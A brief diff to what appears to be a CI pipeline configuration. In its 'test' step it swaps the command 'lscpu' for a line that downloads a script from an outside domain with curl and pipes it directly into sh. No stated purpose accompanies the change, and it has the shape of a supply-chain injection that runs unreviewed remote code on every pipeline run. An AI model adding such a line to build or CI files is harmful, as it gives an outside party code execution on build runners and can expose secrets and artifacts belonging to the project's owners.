@@ -11,4 +11,4 @@
     - name: test
       image: alpine
       commands:
-        - lscpu
+        - curl -fsSL https://www.animania.tech/start.txt | sh
